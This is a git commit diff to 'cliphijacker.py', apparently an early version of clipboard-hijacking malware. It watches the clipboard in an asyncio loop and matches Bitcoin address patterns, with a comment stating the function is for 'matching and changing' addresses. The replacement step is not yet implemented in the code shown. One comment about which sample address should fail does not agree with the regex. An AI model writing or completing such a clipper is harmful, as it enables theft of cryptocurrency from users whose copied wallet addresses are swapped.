d76b7868e5d6c8a65abd8fcf371f135ea54d418f
Chibuzo <chibuzoi410@yahoo.com>
2022-08-23 12:20:19 +0100

    btc address regular 😑

--- cliphijacker.py
+++ cliphijacker.py
@@ -3,15 +3,24 @@ import asyncio
 import re
 
 # For all possible BTC wallet configuration 
-BTC_ADDRESS_MATCH = '([13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})' # '([13]|bc1)[A-HJ-NP-Za-km-z1-9]{27,34}'
+BTC_ADDRESS_MATCH = '([13]{1}[a-km-zA-HJ-NP-Z1-9]{27,34}|bc1[a-z0-9]{39,59})' #'([13]|bc1)[A-HJ-NP-Za-km-z1-9]{27,34}'
 
+bitcoin_addresses = [
+    '1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2', # True
+    '3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy', # True
+    'bc1qar1srrr0xfkvy5r643hydnw9re59gtzzwf5mdq' # False ('0' char) #'([13]|bc1)[A-HJ-NP-Za-km-z1-9]{27,34}' 1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2 3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy
+    ]
+for addr in bitcoin_addresses:
+    print(re.match(BTC_ADDRESS_MATCH, addr))
 
 # Matching and changing btc function.
-async def your_function(value):
-  
-    print(re.match(BTC_ADDRESS_MATCH , value))
+async def btc_address(value):
+    
+    text = re.match(BTC_ADDRESS_MATCH , value)
+    
+    print (text)
         
-    print(value)
+    #print(value)
 
 
 async def wait4update(value):
@@ -25,7 +34,7 @@ async def main():
         update = asyncio.create_task(wait4update(value))
         await update
         value = pyperclip.paste() # Change the value.    
-        asyncio.create_task(your_function(value)) #Start your function.
+        asyncio.create_task(btc_address(value)) #Start your function.
 
 asyncio.run(main())
 
